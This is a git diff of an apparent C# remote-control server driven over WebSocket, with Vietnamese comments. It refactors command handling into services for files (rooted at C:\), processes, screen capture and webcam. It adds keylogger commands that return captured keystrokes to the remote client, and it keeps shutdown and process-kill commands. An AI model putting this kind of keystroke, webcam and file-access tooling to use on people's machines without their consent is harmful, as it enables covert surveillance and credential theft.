@@ -15,73 +15,48 @@ namespace WebSocketTest
     public class SimpleWebSocketServer
     {
         private HttpListener? _listener;
-        private Action<string> _logger;
+        private Core.Server? _server;
+        private Core.Router? _router;
+        private readonly Action<string> _logger = _ => { };
         private WebSocket? _currentSocket;
         private bool _isRunning = false;
         private readonly SemaphoreSlim _sendSemaphore = new SemaphoreSlim(1, 1); // Đồng bộ SendAsync
-        private readonly FileManager _fileManager;
-
         public SimpleWebSocketServer(Action<string> loggerMethod)
         {
+            if (loggerMethod == null) throw new ArgumentNullException(nameof(loggerMethod));
             _logger = loggerMethod;
-            // init FileManager rooted at the app base directory
+
+            // Default root
+            string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+
+            // Try preferred root (C:\) but keep fallback if it fails
+            string root = homeDir;
             try
             {
-                // Root directory để truy cập file: C:\ (hoặc có thể config)
-                _fileManager = new FileManager(@"C:\", 
-                    maxStreamFileSizeBytes: 500L * 1024 * 1024); // 500MB limit
+                // prefer C:\ if available
+                if (Directory.Exists("C:\\")) root = @"C:\";
             }
-            catch (Exception ex)
-            {
-                _logger?.Invoke("FileManager init error: " + ex.Message);
-                try
-                {
-                    // Fallback to user home directory
-                    string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                    _fileManager = new FileManager(homeDir);
-                }
-                catch
-                {
-                    _logger?.Invoke("Failed to initialize FileManager with fallback");
-                }
-            }
+            catch { }
+
+            // Initialize services and router
+            var appService = new Services.AppService();
+            var processService = new Services.ProcessService();
+            var fileService = new Services.FileService(root, maxStreamFileSizeBytes: 500L * 1024 * 1024);
+            var screenService = new Services.ScreenService();
+            var webcamService = new Services.WebcamService();
+
+            _router = new Core.Router(appService, processService, fileService, screenService, webcamService, SendToClientAsync);
         }
 
         // Trong hàm Start(), xử lý HTTP request song song với WebSocket
         public async void Start(string url)
         {
-            _listener = new HttpListener();
-            _listener.Prefixes.Add(url);
-            _listener.Start();
-            _isRunning = true;
-            _logger($"Server đã khởi động tại: {url}");
-
-            try
-            {
-                while (_listener.IsListening && _isRunning)
-                {
-                    var context = await _listener.GetContextAsync();
-                    
-                    // ✅ XỬ LÝ HTTP HEALTH CHECK
-                    if (context.Request.Url?.AbsolutePath == "/health")
-                    {
-                        await HandleHealthCheck(context);
-                    }
-                    else if (context.Request.IsWebSocketRequest)
-                    {
-                        _ = ProcessClient(context);
-                    }
-                    else 
-                    { 
-                        context.Response.StatusCode = 400; 
-                        context.Response.Close(); 
-                    }
-                }
-            }
-            catch (Exception ex) { _logger("Lỗi Server: " + ex.Message); }
+            // Delegate lifecycle to Core.Server while keeping backwards-compatible wrapper
+            _server = new Core.Server(_logger);
+            _ = _server.Start(url, ProcessClient);
         }
 
-        // ✅ ENDPOINT HEALTH CHECK
+        // NOTE: health check handled by Core.Server; leave HandleHealthCheck in place for parity
         private async Task HandleHealthCheck(HttpListenerContext context)
         {
             var response = new 
@@ -102,13 +77,7 @@ namespace WebSocketTest
 
         public void Stop()
         {
-            _isRunning = false;
-            if (_listener != null && _listener.IsListening)
-            {
-                _listener.Stop();
-                _listener.Close();
-                _logger("Server đã dừng");
-            }
+            _server?.Stop();
         }
         
 
@@ -139,7 +108,7 @@ namespace WebSocketTest
                     string message = Encoding.UTF8.GetString(buffer, 0, result.Count);
                     _logger($"[Client]: {message}");
 
-                    string response = HandleCommand(message);
+                    string response = _router != null ? _router.Dispatch(message) : HandleCommand(message);
                     await SendToClient(response);
                 }
             }
@@ -414,11 +383,17 @@ namespace WebSocketTest
 
                     case "keylog_stop":
                         KeyLoggerService.Stop();
-                        string logs = KeyLoggerService.GetLogs();
-                        string safeLogs = logs.Replace("\r", "").Replace("\n", "\\n").Replace("\"", "\\\"");
-                        KeyLoggerService.ClearLogs();
-                        return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";
+                        return JsonSuccess("Đã dừng ghi phím.");
 
+                    case "keylog_get":
+                        string logs = KeyLoggerService.GetLogs();
+                        // Cần encode JSON cẩn thận vì log có thể chứa ký tự xuống dòng
+                        string safeLogs = logs.Replace("\r", "").Replace("\n", "\\n").Replace("\"", "\\\"");
+                        return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";
+                    
+                    case "keylog_clear":
+                        KeyLoggerService.ClearLogs();
+                        return JsonSuccess("Đã xóa file log.");
                     // --- SHUTDOWN / RESTART COMMANDS ---
                     case "shutdown":
                         ShutdownRestart.Shutdown();
@@ -468,88 +443,7 @@ namespace WebSocketTest
         }
 
         // --- LOGIC APP ---
-        private string GetApplicationList()
-            {
-                var processes = Process.GetProcesses();
-                StringBuilder sb = new StringBuilder();
-
-                // SỬA QUAN TRỌNG: Thêm header JSON đúng chuẩn mà Web App yêu cầu
-                sb.Append("{\"type\": \"apps\", \"data\": [");
-                
-                bool isFirst = true;
-                foreach (var p in processes)
-                {
-                    string title = p.MainWindowTitle;
-                    string processName = p.ProcessName;
-
-                    // Chỉ lấy những Process CÓ tiêu đề cửa sổ thực sự
-                    if (!string.IsNullOrEmpty(title))
-                    {
-                        if (!isFirst) sb.Append(",");
-                        
-                        // Xử lý ký tự đặc biệt để tránh lỗi JSON
-                        string safeTitle = title
-                            .Replace("\\", "\\\\")
-                            .Replace("\"", "\\\""); 
-                        
-                        sb.Append($"{{\"pid\": {p.Id}, \"ten\": \"{processName}\", \"tieu_de\": \"{safeTitle}\"}}");
-                        isFirst = false;
-                    }
-                }
-                // Đóng JSON đúng chuẩn
-                sb.Append("]}");
-                return sb.ToString();
-            }
-
-        private string StopAppByName(string name)
-        {
-            if (string.IsNullOrEmpty(name)) return JsonError("Thiếu tên App");
-            var procs = Process.GetProcessesByName(name);
-            if (procs.Length == 0) return JsonError("Không tìm thấy App: " + name);
-            
-            foreach (var p in procs) { try { p.Kill(); } catch { } }
-            return JsonSuccess($"Đã đóng {procs.Length} cửa sổ '{name}'");
-        }
-
-        private string StartApp(string path)
-        {
-            if (string.IsNullOrEmpty(path)) return JsonError("Thiếu tên/đường dẫn");
-            Process.Start(path);
-            return JsonSuccess("Đã khởi động: " + path);
-        }
-
-        // --- LOGIC PROCESS (MỚI) ---
-        private string GetFullProcessList()
-        {
-            var processes = Process.GetProcesses();
-            StringBuilder sb = new StringBuilder();
-            // Thêm định danh type: processes để Client phân biệt
-            sb.Append("{\"type\": \"processes\", \"data\": [");
-            
-            for (int i = 0; i < processes.Length; i++)
-            {
-                var p = processes[i];
-                long mem = 0;
-                try { mem = p.WorkingSet64 / 1024 / 1024; } catch { } // MB
-
-                sb.Append($"{{\"pid\": {p.Id}, \"ten\": \"{p.ProcessName}\", \"mem\": {mem}}}");
-                if (i < processes.Length - 1) sb.Append(",");
-            }
-            sb.Append("]}");
-            return sb.ToString();
-        }
-
-        private string KillProcessByPid(int pid)
-        {
-            try
-            {
-                var p = Process.GetProcessById(pid);
-                p.Kill();
-                return JsonSuccess($"Đã diệt Process ID {pid} ({p.ProcessName})");
-            }
-            catch (ArgumentException) { return JsonError($"Không tồn tại Process ID {pid}"); }
-            catch (Exception ex) { return JsonError("Không thể diệt: " + ex.Message); }
-        }
+// Legacy handlers were moved to Legacy/OldCommandHandlers.cs to keep repository tidy and avoid duplication
 
         // Helpers
         private string JsonSuccess(string msg) => $"{{\"trang_thai\": \"thanh_cong\", \"thong_bao\": \"{msg}\"}}";
